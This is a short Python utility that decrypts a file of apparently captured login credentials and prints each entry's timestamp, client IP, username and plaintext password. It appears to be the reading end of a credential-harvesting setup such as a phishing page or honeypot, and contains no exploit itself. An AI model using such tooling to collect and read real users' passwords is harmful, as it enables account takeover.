import os
import json
from cryptography.fernet import Fernet

CONFIG_PATH = os.path.join(os.path.dirname(__file__), 'config.json')
CRED_FILE = os.path.join(os.path.dirname(__file__), 'login_details', 'captured_credentials.enc')

def main():
    with open(CONFIG_PATH) as f:
        config = json.load(f)

    fernet = Fernet(config['fernet_key'].encode())

    if not os.path.exists(CRED_FILE):
        print("No credentials file found.")
        return

    with open(CRED_FILE, 'rb') as f:
        lines = f.readlines()

    print(f"Decoded credentials from {CRED_FILE}:\n")

    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            decrypted = fernet.decrypt(line)
            data = json.loads(decrypted.decode())
            print(f"Time: {data['timestamp']}")
            print(f"Client IP: {data['client_ip']}")
            print(f"Username: {data['username']}")
            print(f"Password: {data['password']}")
            print("-" * 40)
        except Exception as e:
            print(f"Failed to decrypt a line: {e}")

if __name__ == '__main__':
    main()
